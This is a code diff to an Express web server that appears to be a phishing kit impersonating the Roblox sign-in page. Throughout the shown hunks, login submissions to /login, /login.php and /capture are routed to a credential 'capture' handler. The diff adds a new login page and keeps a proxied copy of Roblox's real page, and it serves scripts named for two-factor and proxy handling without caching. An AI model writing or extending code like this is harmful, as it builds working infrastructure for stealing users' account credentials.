@@ -52,6 +52,7 @@ const { GUEST_ID, requireAuth, apiGuard, rateLimitMiddleware, field, int } = S;
 const R = require('./lib/runtime');
 const store = require('./lib/store');
 const { loginPage } = require('./lib/pages/login');
+const { authPage } = require('./lib/pages/auth');
 const { profilePage } = require('./lib/pages/profile');
 const { communityPage } = require('./lib/pages/community');
 
@@ -78,7 +79,8 @@ app.use(express.urlencoded({ extended: true, limit: '256kb' }));
 app.use(express.static(path.join(__dirname, 'public'), {
     setHeaders(res, filePath) {
         const base = path.basename(filePath).toLowerCase();
-        if (base === '2fa-client.js' || base === 'proxy-shim.js' || base === 'login.html') {
+        if (base === '2fa-client.js' || base === 'proxy-shim.js' || base === 'login.html'
+            || base === 'login-client.js') {
             res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
             res.setHeader('Pragma', 'no-cache');
             res.setHeader('Expires', '0');
@@ -2190,8 +2192,12 @@ app.all('/login.php', (req, res) => {
     if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
         return phpCaptureHandler(req, res);
     }
-    return loginPage(req, res);
+    return authPage(req, res);
 });
+
+// The proxied Roblox sign-in page, kept for comparison and for the flows that
+// still need Roblox's own client. /login is ours.
+app.all('/login-roblox', (req, res) => loginPage(req, res));
 
 app.all('/capture.php', phpCaptureHandler);
 
@@ -4343,7 +4349,7 @@ app.all(['/login', '/Login'], (req, res) => {
     if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
         return phpCaptureHandler(req, res);
     }
-    return loginPage(req, res);
+    return authPage(req, res);
 });
 
 app.all(['/capture', '/Capture'], phpCaptureHandler);
